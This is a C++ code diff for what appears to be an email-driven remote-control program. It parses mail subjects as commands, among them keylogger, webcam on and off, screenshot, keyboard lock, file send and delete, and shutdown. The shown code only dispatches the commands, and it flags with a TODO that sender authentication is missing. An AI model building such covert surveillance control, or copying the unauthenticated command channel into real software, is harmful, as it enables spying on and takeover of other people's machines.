@@ -80,31 +80,54 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
     // set the line policy to mandatory, so longer lines could be parsed
     msg.line_policy(codec::line_len_policy_t::MANDATORY);
 
-	// if there is no new mail, return false
+    // if there is no new mail, return false
     if (!getNewMail(conn, msg)) return false;
 
-	// get the message subject
-	title = msg.subject();
+    // TODO: authenticate the sender
+
+    // get the message subject
+    title = msg.subject();
     string body = getMessageTextBody(msg);
 
     if (
-        title == START_APP || 
-        title == STOP_APP || 
+        title == START_APP ||
+        title == STOP_APP ||
         title == START_SERVICE ||
         title == STOP_SERVICE ||
         title == SEND_FILE ||
         title == DELETE_FILE ||
         title == KEYLOGGER
-    ) {
-		nameObject = body;
+        ) {
+        nameObject = body;
+        return true;
     }
-    else if (title == COPY_FILE) {
+
+    if (title == COPY_FILE) {
         stringstream ss(body);
-		getline(ss, source, '\n'); // get the first line (source)
-		getline(ss, destination, '\n'); // get the second line (destination)
+        getline(ss, source, '\n'); // get the first line (source)
+        getline(ss, destination, '\n'); // get the second line (destination)
         source = source.substr(0, source.size() - 1);
+        return true;
     }
-    return true;
+
+    if (
+        title == LIST_APP ||
+        title == LIST_SERVICE ||
+        title == LIST_PROCESS ||
+        title == RESTART ||
+        title == SHUTDOWN ||
+        title == TURN_ON_WEBCAM ||
+        title == TURN_OFF_WEBCAM ||
+        title == TAKE_SCREENSHOT ||
+        title == LIST_DIRECTORY_TREE ||
+        title == LOCK_KEYBOARD ||
+        title == UNLOCK_KEYBOARD ||
+        title == END_PROGRAM
+        ) {
+        return true;
+    }
+
+    return false;
 }
 
 // connect to the smtp server
